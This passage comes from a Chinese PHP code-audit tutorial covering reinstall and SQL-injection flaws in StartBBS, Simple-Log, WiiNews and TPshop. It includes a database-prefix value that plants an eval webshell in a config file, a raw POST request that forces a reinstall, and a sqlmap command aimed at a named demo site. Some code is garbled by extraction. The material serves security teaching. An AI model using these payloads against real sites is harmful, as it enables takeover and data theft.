D.两都都不是
$_POST $_GET $_REQUEST 含义？
什么是代码审计？
代码审计需要会开发吗？
在我遇到的一些人中，有些说要有些说不需要，这里不评论。 可在我
qq 空间留言你息怕想法，千万不要因为别人说什么就是什么。
搭一个自己的代码审计环境。
- 20 -
重装漏洞
首先拿到一份源码 肯定是先 install 上。 而在安装文件上又会经
常出现问题。
其他的基本都是通过生成一个 lock 文件 来判断程序是否安装过
了 如果存在这个 lock 文件了 就会退出了。 这里首先 先来说一下安
装文件经常出现的问题。
开源轻论坛 StartBBS 前台 getshell
作者：phith0n
安装好后发现根目录下多了一个 install.lock，一般的 cms 为了防止
被重安装就会在目录下生成一个类似的文件，下次有人再访问安装脚本的
时候，脚本会检测，如果目录下有这个文件就提示“请删除后再安装”。
原本应该是没有任何问题的。但我们来到安装脚本，
/app/controllers/install.php 中，查看它是怎么处理的：
class Install extends Install_Controller
{
function __construct ()
{
parent::__construct();
$this->load->library('myclass');
$file=FCPATH.'install.lock';
if (file_exists($file)){
$this->myclass->notice('alert("系统已安装过
");window.location.href="'.site_url().'";');
}
}
- 21 -
构造函数里检查是否存在 install.lock，然后用 javascript 的方式告诉
用户“系统已安装过”，然后跳转。但是这个脚本根本还没有结束嘛，这
个类里的函数都可以运行，并不因为返回了一个 window.location.href
就停止运行。（this->myclass->notice()中也没有停止运行的代码）
然后，在往下翻，就能看到安装的函数：
public function step($step)
{
$data['step']=$step;
if($step==1 || $step==2){
$data['permission'] = $this->_checkFileRight();
$this->load->view('install',$data);
}
if($step==3){
$this->_install_do();
}
}
function _install_do()
{
$data['step']=3;
if($_POST){
$dbhost = $this->input->post('dbhost');
$dbport = $this->input->post('dbport');
$dbname = $this->input->post('dbname');
$dbuser = $this->input->post('dbuser');
$dbpwd =
$this->input->post('dbpwd')?$this->input->post('dbpwd'):'';
$dbprefix = $this->input->post('dbprefix');
$userid = $this->input->post('admin');
$pwd = md5($this->input->post('pwd'));
$email = $this->input->post('email');
$sub_folder = '/'.$this->input->post('base_url').'/';
$conn =
- 22 -
mysql_connect($dbhost.':'.$dbport,$dbuser,$dbpwd);
if (!$conn) {
die('无法连接到数据
库服务器，请检查用户名和密码是否正确');
}
if($this->input->post('creatdb')){
if(!@mysql_query('CREATE
DATABASE IF NOT EXISTS '.$dbname)){
die('指定的数据库('.$dbname.')系统尝试创建失败，请通过其他方式
建立数据库');
}
}
if(!mysql_select_db($dbname,$conn)){
die($dbname.'数据库不存在，请创
建或检查数据名.');
}
$sql = file_get_contents(FCPATH.'app/config/startbbs.sql');
$sql = str_replace("sb_",$dbprefix,$sql);
$explode = explode(";",$sql);
$data['msg1']="创建表".$dbname."成功，请稍后……";
foreach ($explode as $key=>$value){
if(!empty($value)){
if(trim($value)){
mysql_query($value.";");
}
}
}
$password = $pwd;
$ip=$this->myclass->get_ip();
$insert= "INSERT INTO
".$dbprefix."users (group_type,gid,is_active,username,password,email,regtime,ip)
VALUES ('0','1','1','".$userid."','".$password."','".$email."','".time()."','".$ip."')";
mysql_query($insert);
- 23 -
mysql_close($conn);
$data['msg2']="安装完成，正在保存配置文件，
请稍后……";
$dbconfig = "."\$active_group = 'default';\n"
."\$active_record = TRUE;\n"
."\$db['default']['hostname'] = '".$dbhost."';\n"
."\$db['default']['port'] = '".$dbport."';\n"
."\$db['default']['username'] = '".$dbuser."';\n"
."\$db['default']['password'] = '".$dbpwd."';\n"
."\$db['default']['database'] = '".$dbname."';\n"
."\$db['default']['dbdriver'] = 'mysql';\n"
."\$db['default']['dbprefix'] = '".$dbprefix."';\n"
."\$db['default']['pconnect'] = TRUE;\n"
."\$db['default']['db_debug'] = TRUE;\n"
."\$db['default']['cache_on'] = FALSE;\n"
."\$db['default']['cachedir'] = 'app/cache';\n"
."\$db['default']['char_set'] = 'utf8';\n"
."\$db['default']['dbcollat'] = 'utf8_general_ci';\n"
."\$db['default']['swap_pre'] = '';\n"
."\$db['default']['autoinit'] = TRUE;\n"
."\$db['default']['stricton'] = FALSE;";
$file = FCPATH.'/app/config/database.php';
file_put_contents($file,$dbconfig);
//保存 config 文件
if($sub_folder){
$this->config->update('myconfig','sub_folder', $sub_folder);
}
$encryption_key =
md5(uniqid());
if($encryption_key){
$this->config->update('myconfig','encryption_key', $encryption_key);
- 24 -
}
$data['msg3']="保存配
置文件完成！";
touch(FCPATH.'install.lock');
$data['msg4']="创建锁定安装文件 install.lock
成功";
$data['msg5']="安装
startbbs 成功！";
}
$this->load->view('install',$data);
}
当 step 函数的参数为 3 时，就执行安装函数_install_do()，这个函数
里初始化了数据库，并把数据库配置文件写入了
“/app/config/database.php”。于是，我们可以构造一下数据包直接
把一句话写入到这个配置文件里。
我们看到，这个函数接收了许多 post 数据：
$dbhost = $this->input->post('dbhost');
$dbport = $this->input->post('dbport');
$dbname = $this->input->post('dbname');
$dbuser = $this->input->post('dbuser');
$dbpwd =
$this->input->post('dbpwd')?$this->input->post('dbpwd'):'';
$dbprefix = $this->input->post('dbprefix');
$userid = $this->input->post('admin');
$pwd = md5($this->input->post('pwd'));
$email = $this->input->post('email');
$sub_folder = '/'.$this->input->post('base_url').'/';
其中 dbhost、dbport、dbname、dbuser、dbpwd 都不能随便乱写，
- 25 -
乱写的话安装就会出错，而 userid、pwd、email、sub_folder 都是写入
数据库的，不写入配置文件。所以就剩下 dbprefix 了，所以我们可以这
样构造这个字段：
dbprefix=sb_';@eval ($_POST[101]);$xxx='
安装的时候
Simple-Log 博客系统全版本重安装漏洞
作者：猪头子
在没有删除 install 文件夹的情况下，install/index.php 中用户可以
提交远程 mysql 账号和密码，导致 simple-log 会重新安装，由于 header()
函数并不会结束之后的代码，因此漏洞出现。
$setup=! empty($_POST['setup' ])?$_POST['setup']: 'check';
if (file_exists(PBBLOG_ROOT.'home/data/config.php' ))
{
require_once(PBBLOG_ROOT.'home/data/config.php' );
}
//用户只要以 post 方式提交 setup=finish 就可进入安装流程
if ($install_lock&& $setup!='finish')
{
- 26 -
//header 头并不会结束之后的代码，漏洞出在这里
header( 'location: ../index.php');
}
elseif ($setup=='finish' )
{
$error= array();
if (empty ($_POST['host']))
{
$error[]= '请填写数据库地址' ;
}
if (empty ($_POST['dbname']))
{
$error[]= '请填写数据库' ;
}
if (empty ($_POST['dbuser']))
{
$error[]= '请填写数据库用户名' ;
}
if (empty ($_POST['admin_user']))
{
$error[]= '请填写管理员账号' ;
}
if (empty ($_POST['admin_pass']))
{
$error[]= '请填写管理员密码' ;
}
if (empty ($_POST['blogname']))
{
$error[]= '请填写博客名字' ;
}
if ($error)
{
echo '错误信息';
foreach ($error as $val)
- 27 -
{
echo "$val ";
}
exit;
}
//这里填写自己 mysql 数据库的连接信息
$dbhost=$_POST[ 'host'];
$dbuser=$_POST[ 'dbuser'];
$dbpw=$_POST[ 'dbpass'];
$dbname=$_POST[ 'dbname'];
$charset
= 'utf8';
$db= new cls_mysql();
if ($db->connect($dbhost,$dbuser,$dbpw,$dbname,$charset, $pconnect))
{
$error[]= '数据库连接错误' ;
}
if (empty ($_POST['dbprefix']))
{
$dbprefix='fb_';
}
else
{
$dbprefix=$_POST['dbprefix'];
}
//提交的 admin_user 和 admin_pass 最后将成为 web 管理员的账号和密码
$admin_user=$_POST[ 'admin_user'];
$admin_pass=$_POST[ 'admin_pass'];
$blogname=$_POST[ 'blogname'];
$blogdesc=$_POST[ 'blogdesc'];
$blog_keyword=$_POST[ 'blogkeyword'];
- 28 -
//之后就写入配置文件和更新数据库，再以后这个 simple-log 的数据库将
使用用户提交的数据库
PoC:
POST http://xxx/install/index.php HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64; U; Edition IBIS; zh-cn)
Presto/2.10.229 Version/11.64
Host: www.xxx.com
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png,
image/webp, image/jpeg, 省略...
setup=finish&host=mysql 的地址&dbname=数据库名&dbuser=帐号&dbpass=密码
&admin_user=管理员帐号&admin_pass=管理员密码&blogname=博客名
- 29 -
不好意思，第一章我就放这个，如果没有基础的同学当然是看
不懂。我建议一下你去学完 php 在来，但是不要灰心。接下来
- 30 -
才是刚开始，现在的重装漏洞少之又少，所以可以不要在意细
节。
上面我是故意放这些案例，其实我也完
全看不懂。
SQL 注入漏洞
SQL 注入攻击（SQL Injection），简称注入攻击，SQL 注入是
web 开发中最常见的一种安全漏洞。SQL 注入漏洞可以用来从数据库
获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一
系列恶意操作，甚至有可能获取数据库乃至系统最高权限
现在注入可分为六种，哪六种呢？可以参考 sqlmap 目录下的
payloads
01_boolean_blind.xml
02_error_based.xml
03_inline_query.xml
04_stacked_queries.xml 05_time_blind.xml
06_union_query.xml
其实还不止，还有二次注入等等
- 31 -
WiiNews(Mobile 新闻系统)
作者：路人甲
先来段简单的程序：
$id=sqlReplace(Trim($_GET['id']));
$sqlStr="select * from wiinews_news where news_id=$id";
$result = mysql_query($sqlStr) or die ("查询失败，请检查 SQL 语句。
编码号：1010");
$row = mysql_fetch_array($result);
这里通过$_GET 之后给了 sqlReplace()这个函数处理。然而，trim 是
什么自己抱着手册来看。
然后就带入了 sql 查询，但在之之后，我们需要查看 sqlReplace()这个
函数对$_GET['id'] 做了一些什么处理
function sqlReplace($str)
{
$strResult = $str;
if(!get_magic_quotes_gpc())
//如果 gpc 没有开的话
{
$strResult = addslashes($strResult);
//编码
- 32 -
}
return HTMLEncode($strResult);
//gpc 开的话，返回 HTMLEncode()
}
这里判断如果 gpc 没有开启的话通过 php 内置函数 addslashesf 进行
处理。如果开启的话则用 HTMLEncode 来处理。这里继续来路进这个
函数
function HTMLEncode($str){
if (!empty($str)){
$str=str_replace("&","&",$str);
$str=str_replace(">",">",$str);
$str=str_replace(" 5.3.0 !');
//检测是否已安装TPshop系统
if(file_exists("./Install/") && !file_exists("./Install/install.lock")){
if($_SERVER['PHP_SELF'] != '/index.php'){
header("Content-type: text/html; charset=utf-8");
exit("请在域名根目录下安装,如:
www.xxx.com/index.php 正确 
www.xxx.com/www/index.php 错误,域名后面不能圈套目录, 但项
目没有根目录存放限制,可以放在任意目录,apache虚拟主机配置一下
即可");
}
header('Location:/Install/index.php');
exit();
}
error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外
的所有错误信息
- 35 -
// 开启调试模式 建议开发阶段开启 部署阶段注释或者设为false
define('APP_DEBUG',false);
// 定义应用目录
define('APP_PATH','./Application/');
//
定义插件目录
define('PLUGIN_PATH','plugins/');
看到定义的程序目录为：
define('APP_PATH','./Application/');
来到这目录下查看一些常用的文件
File:Application/Home/Controller/ApiController.class.php
Code:20
class ApiController extends Controller {
/*
* 获取地区
*/
public function getRegion(){
$parent_id = I('get.parent_id');
$selected = I('get.selected',0);
$data =
M('region')->where("parent_id=$parent_id")->select();
$html = '';
if($data){
foreach($data as $h){
if($h['id'] == $selected){
$html .= "{$h['name']}";
}
$html .= "{$h['name']}";
- 36 -
}
}
echo $html;
}
这里通过`I('get.parent_id')` 这是 thinkphp 的一个写法，通过 GET
接收 parent_id 这个变量
获取的 parent_id 之后直接带入了数据库查询：
$data = M('region')->where("parent_id=$parent_id")->select();
这里存在注入
demo 注入：
sqlmap git:(master) ✗ python sqlmap.py -u
"http://demo2.tp-shop.cn/index.php?m=Home&c=Api&a=get
Region&parent_id=2" -p parent_id -v 3
其实我来总结一下，代码审计首先你得看得懂代码。可能你学完 php
基础之后还是对有些程序看不懂，其实已经利用了框架开发，所以这
- 37 -
时候你要开始学习框架，等学完了你再来看这套程序的时候。你就会
突然明白很多。
74CMS 人才系统注入全版本通杀进后台
作者：小屁孩